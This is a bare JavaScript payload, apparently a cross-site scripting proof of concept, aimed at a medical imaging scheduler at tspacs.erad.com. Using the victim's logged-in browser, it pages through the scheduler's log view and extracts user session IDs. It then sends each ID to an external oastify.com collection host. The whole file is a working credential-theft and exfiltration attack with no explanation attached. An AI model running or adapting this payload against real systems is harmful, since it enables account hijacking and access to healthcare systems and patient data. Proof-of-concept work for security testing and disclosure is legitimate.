(function(){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cTable=LogView&cLayoutType=schLog&cIDField=0LID&cInputID=xxx&cDispField=0LID&cDispField=0LED&cDispField=0LUI&cDispField=0LAC&cDispField=0LTA&cDispField=0LLP&cDispField=0LSD&cDispField=0LMO&cDispField=0LIN',{credentials:'include',redirect:'manual'})
.then(r=>{
let loc=r.headers.get('Location')||'';
let c=loc.match(/cContext=([^&]+)/);
if(c){
let ctx=c[1];
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cContext='+ctx,{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let m=t.match(/<A\s+href="JavaScript:\s*redirPage_eP\('\/scheduler\/valueSelectorPopupTable\.jsp\?cPage=(\d+)'\)">Last<\/a>/i);
if(m){
let l=parseInt(m[1],10);
for(let p=l;p>l-10;p--){
fetch('https://tspacs.erad.com/scheduler/valueSelectorPopupTable.jsp?cPage='+p+'&cContext=Context_28',{credentials:'include'})
.then(r=>r.text())
.then(t=>{
let s=t.match(/logged in; session ID:\s*([^;]+);/i);
if(s) fetch('https://288txy69u88zcpjq6tg9h8l74yapyh25r.oastify.com?s='+encodeURIComponent(s[1].trim()),{mode:'no-cors'});
});
}
}
});
}
});
})();
